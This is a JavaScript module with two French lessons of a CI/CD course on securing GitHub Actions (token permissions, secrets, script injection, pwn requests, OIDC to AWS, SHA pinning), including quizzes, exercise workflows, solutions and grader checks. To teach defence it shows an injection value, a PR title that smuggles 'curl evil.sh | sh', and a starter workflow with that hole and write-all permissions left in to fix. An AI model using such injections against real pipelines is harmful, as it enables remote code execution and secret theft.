/* Cours CI/CD — chapitre 6 : secrets, permissions, OIDC et chaîne d'approvisionnement. */
import { Y } from "./tag.js";

const CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1";
const AWS = "aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0";

export default [
  {
    id: "ci-11", section: "Sécuriser le pipeline", title: "Secrets et permissions du GITHUB_TOKEN", xp: 85,
    theory: Y`<p>Un pipeline a accès au code, aux secrets et souvent à la production : c'est une cible de choix. Trois réflexes.</p>
<p><strong>1. Les secrets.</strong> Ils se rangent dans <em>Settings → Secrets and variables → Actions</em>, au niveau du dépôt, de l'organisation ou d'un <em>environnement</em> (chapitre 8), et se lisent avec @@\${{ secrets.NOM }}@@. GitHub masque leur valeur dans les logs, mais pas ses transformations (encodée en base64, coupée en morceaux) : on ne les affiche jamais. Les valeurs non sensibles (une région, un nom de bucket) vont dans les <em>variables</em> : @@\${{ vars.NOM }}@@.</p>
<p><strong>2. Le @@GITHUB_TOKEN@@.</strong> Chaque exécution reçoit un jeton temporaire pour agir sur le dépôt (cloner, commenter une PR, publier une release). Ses droits se règlent avec @@permissions@@ : au niveau du workflow pour tous les jobs, ou par job (la valeur du job remplace alors celle du workflow). La règle : @@contents: read@@ partout, et chaque droit d'écriture seulement dans le job qui en a besoin. Si un attaquant prend la main sur une étape, il n'aura que ces droits-là.</p>
<p><strong>3. Le code et les données qui viennent de l'extérieur.</strong></p>
<ul><li>@@pull_request@@ venant d'un fork : pas de secrets et un jeton en lecture seule. C'est voulu ;</li><li>@@pull_request_target@@ : secrets et jeton en écriture, car il tourne dans le contexte de ta branche. Y récupérer et exécuter le code de la PR, c'est donner tes secrets à un inconnu : la « pwn request ». Depuis la version 7, @@actions/checkout@@ refuse par défaut ce cas le plus courant ;</li><li>une expression dans @@run@@ est collée dans le script avant son exécution. Un titre de PR comme @@a"; curl evil.sh | sh; echo "@@ devient une commande. On passe la valeur par une variable d'environnement :</li></ul>
~~~yaml
name: Bienvenue
on: pull_request
permissions:
  contents: read
jobs:
  saluer:
    runs-on: ubuntu-latest
    steps:
      - name: Afficher le titre sans risque
        env:
          TITRE: \${{ github.event.pull_request.title }}
        run: |
          echo "PR : $TITRE"
~~~
<p>Le moteur de Boucle signale ces injections et les « pwn requests », comme le fait <em>actionlint</em> ou <em>zizmor</em> dans un vrai projet.</p>`,
    quiz: [
      { q: "Un job de tests a besoin de lire le code, rien d'autre. Quelles permissions ?", options: ["write-all, pour être tranquille", "contents: read", "Aucune ligne : les valeurs par défaut suffisent toujours", "contents: write"], answer: 1, explain: "Déclarer explicitement contents: read rend le moindre privilège indépendant des réglages par défaut du dépôt ou de l'organisation." },
      { q: "Pourquoi pull_request_target est-il dangereux avec un checkout du code de la PR ?", options: ["Il est plus lent", "Il tourne avec les secrets et un jeton en écriture : exécuter le code d'un fork, c'est lui donner ces accès", "Il ne marche pas sur les forks", "Il supprime la branche"], answer: 1, explain: "C'est l'attaque « pwn request ». Pour tester le code d'une PR, on utilise pull_request." },
      { q: "Un secret apparaît en clair dans un log après un base64. Que faire ?", options: ["Supprimer le log suffit", "Le considérer comme compromis : le révoquer et en créer un nouveau, puis retirer l'affichage", "Rendre le dépôt privé", "Rien, le log est privé"], answer: 1, explain: "Le masquage ne connaît que la valeur exacte. Un secret qui a fuité se remplace." }
    ],
    challenge: {
      prompt: Y`<p>Ce workflow commente chaque PR. Il fonctionne, mais il est dangereux. Sécurise-le :</p><ol><li>au niveau du workflow, @@contents: read@@ seulement (plus de @@write-all@@) ;</li><li>le job @@commenter@@ reçoit uniquement @@pull-requests: write@@ ;</li><li>le titre de la PR ne doit plus être injecté dans le script : passe-le par une variable d'environnement @@TITRE@@ ;</li><li>plus aucun avertissement.</li></ol>`,
      starter: Y`name: Revue
on: pull_request
permissions: write-all
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: pytest -q
  commenter:
    needs: tests
    runs-on: ubuntu-latest
    steps:
      - run: |
          gh pr comment \${{ github.event.pull_request.number }} --repo \${{ github.repository }} \
            --body "Tests OK pour : \${{ github.event.pull_request.title }}"
        env:
          GH_TOKEN: \${{ github.token }}
`,
      solution: Y`name: Revue
on: pull_request
permissions:
  contents: read
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: pytest -q
  commenter:
    needs: tests
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - run: |
          gh pr comment \${{ github.event.pull_request.number }} --repo \${{ github.repository }} \
            --body "Tests OK pour : $TITRE"
        env:
          GH_TOKEN: \${{ github.token }}
          TITRE: \${{ github.event.pull_request.title }}
`,
      checks: {
        permissions: { workflow: { contents: "read" }, commenter: { "pull-requests": "write" } }, maxPermissions: { contents: "read", "pull-requests": "write" },
        lacks: ["write-all"], contains: ["TITRE"], noWarnings: true,
        scenarios: [{ event: { name: "pull_request", head: "feature/x", base: "main" }, run: ["tests", "commenter"] }]
      },
      hint: "permissions: avec contents: read au premier niveau ; dans commenter, un bloc permissions avec pull-requests: write. Dans env, ajoute TITRE: ${{ github.event.pull_request.title }} et utilise $TITRE dans la commande."
    }
  },
  {
    id: "ci-12", section: "Sécuriser le pipeline", title: "OIDC et chaîne d'approvisionnement", xp: 90,
    theory: Y`<p><strong>Plus de clés longue durée.</strong> Stocker une clé d'accès AWS dans les secrets du dépôt, c'est une clé valable des années qui peut fuiter. Avec <strong>OIDC</strong> (OpenID Connect), le workflow demande à GitHub un jeton signé qui dit « je suis le workflow X du dépôt Y, sur la branche main ». AWS (ou Azure, ou Google Cloud) vérifie la signature et donne des identifiants <strong>temporaires</strong>, valables une heure, pour un rôle précis.</p>
<ol><li>Côté AWS, une fois : un <em>identity provider</em> @@token.actions.githubusercontent.com@@, et un rôle IAM dont la politique de confiance n'accepte que ton dépôt, et seulement la branche @@main@@ ou l'environnement @@production@@ ;</li><li>côté workflow : @@permissions: id-token: write@@, puis l'action @@aws-actions/configure-aws-credentials@@ avec @@role-to-assume@@.</li></ol>
~~~yaml
name: Déployer
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-site
          aws-region: ca-central-1
      - run: aws s3 sync ./public s3://mon-site --delete
~~~
<p><strong>La chaîne d'approvisionnement.</strong> Chaque @@uses:@@ exécute le code de quelqu'un d'autre avec tes secrets. En mars 2025, les tags de l'action populaire @@tj-actions/changed-files@@ ont été déplacés vers un commit malveillant, qui affichait les secrets dans les logs de milliers de dépôts. Les défenses :</p>
<ul><li><strong>épingler sur un SHA complet</strong> (@@actions/checkout@3d3c42e…@@) plutôt que sur un tag : un commit ne peut pas être modifié, un tag si. On garde la version en commentaire ;</li><li><strong>Dependabot</strong> (@@.github/dependabot.yml@@) propose des PR pour monter de version, avec le nouveau SHA : on relit et on fusionne ;</li><li>préférer les actions officielles ou vérifiées, et limiter les @@permissions@@ (chapitre précédent).</li></ul>
~~~yaml norun
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: monthly
    groups:
      actions:
        patterns: ["*"]
~~~
<p><strong>Dans Boucle.</strong> Ce sprint a appliqué ces règles à la vraie CI : chaque action est épinglée sur un SHA (sans changer de version), et Dependabot ouvrira chaque mois une PR groupée pour les montées de version. Le moteur des exercices vérifie d'ailleurs la CI de Boucle à chaque exécution des tests unitaires.</p>`,
    quiz: [
      { q: "Quel avantage principal d'OIDC sur une clé d'accès stockée en secret ?", options: ["C'est plus rapide", "Les identifiants sont temporaires et limités à ce dépôt et à cette branche : rien de durable ne peut fuiter", "On n'a plus besoin de rôle IAM", "Ça marche sans Internet"], answer: 1, explain: "Le jeton OIDC prouve l'identité du workflow ; AWS délivre des identifiants d'une heure pour un rôle précis." },
      { q: "Pourquoi épingler une action sur un SHA plutôt que sur @v4 ?", options: ["C'est plus lisible", "Un tag peut être déplacé vers un autre commit, un SHA désigne toujours le même code", "Les SHA sont plus récents", "GitHub l'exige"], answer: 1, explain: "L'incident tj-actions de 2025 a exploité précisément des tags déplacés." },
      { q: "Le workflow obtient « Error: Could not assume role… Not authorized to perform sts:AssumeRoleWithWebIdentity ». Que vérifier d'abord ?", options: ["La région AWS", "permissions: id-token: write dans le workflow, et la politique de confiance du rôle (dépôt et branche autorisés)", "La version de Python", "Le nom du bucket"], answer: 1, explain: "Sans id-token: write, pas de jeton OIDC ; avec une condition de confiance trop stricte (autre branche, autre dépôt), AWS refuse." }
    ],
    challenge: {
      prompt: Y`<p>Ce déploiement utilise des clés AWS longue durée et des actions citées par leur tag. Corrige-le :</p><ol><li>supprime @@AWS_ACCESS_KEY_ID@@ et @@AWS_SECRET_ACCESS_KEY@@ ;</li><li>authentifie-toi par OIDC : permissions @@id-token: write@@ et @@contents: read@@ au niveau du workflow, puis @@aws-actions/configure-aws-credentials@@ avec @@role-to-assume: arn:aws:iam::123456789012:role/deploy-site@@ et @@aws-region: ca-central-1@@ ;</li><li>épingle chaque action sur son SHA complet :<br>@@${CHECKOUT}@@<br>@@${AWS}@@</li></ol>`,
      starter: Y`name: Déployer
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: \${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_DEFAULT_REGION: ca-central-1
    steps:
      - uses: actions/checkout@v7
      - run: aws s3 sync ./public s3://mon-site --delete
`,
      solution: Y`name: Déployer
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: ${CHECKOUT}
      - uses: ${AWS}
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-site
          aws-region: ca-central-1
      - run: aws s3 sync ./public s3://mon-site --delete
`,
      checks: {
        lacks: ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"], permissions: { workflow: { "id-token": "write", contents: "read" } },
        uses: { deploy: ["aws-actions/configure-aws-credentials"] },
        with: { deploy: { "aws-actions/configure-aws-credentials": { "role-to-assume": "arn:aws:iam::123456789012:role/deploy-site", "aws-region": "ca-central-1" } } },
        order: { deploy: ["actions/checkout", "aws-actions/configure-aws-credentials", "aws s3 sync"] }, pinned: "sha",
        scenarios: [{ event: { name: "push", branch: "main" }, run: ["deploy"] }]
      },
      hint: "Retire le bloc env du job. Ajoute permissions au premier niveau. Copie les deux lignes « uses » épinglées depuis l'énoncé (le commentaire # v… est facultatif) et donne à l'action AWS un bloc with."
    }
  }
];
